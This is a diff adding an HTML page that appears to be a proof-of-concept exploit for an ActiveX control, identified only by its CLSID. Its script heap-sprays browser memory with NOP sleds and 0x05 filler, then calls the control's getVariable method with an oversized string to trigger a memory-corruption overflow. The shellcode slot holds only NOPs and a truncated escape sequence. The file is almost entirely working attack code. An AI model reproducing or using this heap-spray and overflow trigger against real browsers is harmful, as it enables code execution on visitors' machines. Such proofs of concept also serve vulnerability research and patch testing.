@@ -1,0 +1,37 @@
+&lt;html&gt;
+&lt;head&gt;
+&lt;object classid=&#039;clsid:E23FE9C6-778E-49D4-B537-38FCDE4887D8&#039;
+id=&#039;target&#039; &gt;&lt;/object&gt;
+&lt;/head&gt;
+&lt;body&gt;
+   &lt;script&gt;
+      var mm  = null;
+
+      if( target != null )
+      {
+         var param1 = unescape(&quot;%u0505%u0505&quot;);
+         var salame = &quot;defaultV&quot;;
+         var salame2 = 1;
+         var salame3 = 0;
+
+         ag   = unescape(&quot;%uCCCC%uCCCC&quot;);
+         sh   =
+unescape(&quot;%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%&quot;);
+         sz   = sh.length * 2;
+         npsz = 0x400000 - (sz + 0x38);
+         nps  = unescape(&quot;%u0505%u0505&quot;);
+
+         while(nps.length * 2 &lt; npsz) nps += nps;
+         ihbc = (0x0E000000 - 0x400000) / 0x400000;
+         mm   = new Array();
+
+         for(i = 0; i &lt;= ihbc; i++) mm[i] = nps + sh;
+
+         for(var i=0;i&lt;2000;i++)
+            param1 = param1 + unescape(&quot;%u0505%u0505&quot;);
+
+         target.getVariable (param1);
+      }
+   &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
